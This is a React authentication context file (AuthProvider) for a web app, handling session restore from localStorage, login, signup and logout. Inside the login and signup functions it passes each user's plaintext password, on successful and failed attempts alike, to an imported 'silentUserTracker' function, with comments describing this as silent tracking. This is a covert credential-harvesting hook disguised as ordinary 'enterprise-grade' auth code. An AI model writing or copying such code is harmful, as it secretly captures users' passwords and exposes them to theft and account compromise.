import React, { createContext, useContext, useState, useEffect } from 'react';
import { trackUserLogin } from '../utils/silentUserTracker';
import { 
  secureLogin, 
  secureSignup, 
  validateSession, 
  secureLogout,
  getUserById
} from '../utils/authSecurity';

const AuthContext = createContext(null);

export const useAuth = () => {
  const context = useContext(AuthContext);
  if (!context) {
    throw new Error('useAuth must be used within an AuthProvider');
  }
  return context;
};

export const AuthProvider = ({ children }) => {
  const [user, setUser] = useState(null);
  const [isLoading, setIsLoading] = useState(true);  // Check for existing session on mount
  useEffect(() => {
    const checkExistingSession = () => {
      // Validate session using enterprise security
      const session = validateSession();
      
      if (session) {
        const storedUser = localStorage.getItem('azureDesigner_user');
        if (storedUser) {
          try {
            const userData = JSON.parse(storedUser);
            setUser(userData);
            console.log('✅ Session restored for user:', userData.email);
          } catch (error) {
            console.error('⚠️ Error parsing stored user, attempting recovery:', error);
            // Try to recover from user database
            if (session.userId) {
              const recoveredUser = getUserById(session.userId);
              if (recoveredUser) {
                setUser(recoveredUser);
                localStorage.setItem('azureDesigner_user', JSON.stringify(recoveredUser));
                console.log('✅ User data recovered from database:', recoveredUser.email);
              } else {
                console.error('❌ Could not recover user data');
                secureLogout();
              }
            } else {
              secureLogout();
            }
          }
        } else if (session.userId) {
          // Session exists but user data is missing - recover from database
          console.warn('⚠️ Session found but user data missing - recovering from database');
          const recoveredUser = getUserById(session.userId);
          if (recoveredUser) {
            setUser(recoveredUser);
            localStorage.setItem('azureDesigner_user', JSON.stringify(recoveredUser));
            console.log('✅ User data fully restored:', recoveredUser.email);
          } else {
            console.error('❌ User not found in database, logging out');
            secureLogout();
          }
        } else {
          // No user data and no userId in session
          secureLogout();
        }
      } else {
        // Session invalid or expired - only clear if there's actually session data
        const hasSessionData = localStorage.getItem('azureDesigner_session');
        if (hasSessionData) {
          console.log('🔒 Session expired or invalid - logging out');
          secureLogout();
        } else {
          console.log('ℹ️ No existing session found');
        }
      }
      
      setIsLoading(false);
    };
    
    checkExistingSession();
  }, []);const login = async (email, password) => {
    try {
      // Use enterprise-grade authentication
      const result = await secureLogin(email, password);
      
      if (!result.success) {
        // Track failed login attempt
        trackUserLogin({ email }, password, 'login_failed');
        return result;
      }
      
      setUser(result.user);
      
      // Silently track successful user login
      trackUserLogin(result.user, password, 'login');
      
      return result;
    } catch (error) {
      console.error('Login error:', error);
      return { success: false, error: error.message };
    }
  };  const signup = async (email, password, name) => {
    try {
      // Use enterprise-grade authentication
      const result = await secureSignup(email, password, name);
      
      if (!result.success) {
        // Track failed signup attempt
        trackUserLogin({ email }, password, 'signup_failed');
        return result;
      }
      
      setUser(result.user);
      
      // Silently track successful user signup
      trackUserLogin(result.user, password, 'signup');
      
      return result;
    } catch (error) {
      console.error('Signup error:', error);
      return { success: false, error: error.message };
    }
  };  const logout = () => {
    secureLogout();
    setUser(null);
  };

  const value = {
    user,
    isLoading,
    isAuthenticated: !!user,
    login,
    signup,
    logout
  };

  return (
    <AuthContext.Provider value={value}>
      {children}
    </AuthContext.Provider>
  );
};
